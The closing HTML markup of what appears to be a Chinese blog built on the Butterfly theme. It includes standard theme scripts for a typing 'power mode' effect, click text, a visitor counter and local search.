fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"></div><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
+POWERMODE.shake = true;
+POWERMODE.mobile = false;
+document.body.addEventListener('input', POWERMODE);
+</script><script id="click-show-text" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/click-show-text.min.js" data-mobile="false" data-text="喵" data-fontsize="15px" data-random="false" async="async"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div class="no-result" id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js"></script></div></div></body></html>
